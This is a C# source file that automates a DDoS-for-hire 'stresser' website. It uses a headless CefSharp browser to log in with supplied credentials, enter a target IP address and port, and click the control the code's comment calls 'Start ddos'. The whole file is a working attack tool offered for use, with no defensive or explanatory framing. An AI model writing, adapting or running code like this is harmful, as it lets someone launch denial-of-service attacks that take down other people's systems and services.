using CefSharp;
using System.Threading;

namespace Stressers
{
    public class InstantStresser
    {
        public void StartStresser(string login, string password, string ip, int port)
        {
            bool first = true;
            CefSharp.OffScreen.ChromiumWebBrowser chromiumWebBrowser1 = new CefSharp.OffScreen.ChromiumWebBrowser();
            chromiumWebBrowser1.LoadingStateChanged += async (sender, args) =>
            {
                //Wait for the Page to finish loading
                if (args.IsLoading == false && chromiumWebBrowser1.Address == "https://instant-stresser.com/login")
                {
                    Thread.Sleep(25);
                    /* Auth */
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('form-control')[0].value='" + login + "'");
                    Thread.Sleep(25);
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('form-control')[1].value='" + password + "'");
                    Thread.Sleep(25);
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('btn btn-primary btn-block mt-3 mb-3')[0].click()");
                    Thread.Sleep(25);
                    chromiumWebBrowser1.Load("https://instant-stresser.com/hub");

                }
                else if (chromiumWebBrowser1.Address == "https://instant-stresser.com/hub" && first)
                {
                    first = false;
                    //System.Threading.Thread.Sleep(800);
                    //await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('btn btn-outline-danger btn-sm')[0].click()");
                    /* Cancel other */
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('btn btn-outline-danger')[1].click()");
                    System.Threading.Thread.Sleep(800);
                    /* Input IP */
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('form-control')[2].value='" + ip + "'");
                    Thread.Sleep(25);
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('form-control')[3].value='" + port + "'");
                    /* Start ddos */
                    Thread.Sleep(25);
                    await chromiumWebBrowser1.EvaluateScriptAsync("document.getElementsByClassName('btn btn-falcon-default mr-1 mb-1')[5].click()");
                }
            };
            chromiumWebBrowser1.BrowserInitialized += (a, b) =>
            {
                if (chromiumWebBrowser1.IsBrowserInitialized)
                {
                    chromiumWebBrowser1.Load("https://instant-stresser.com/login");
                }
            };
        }
    }
}
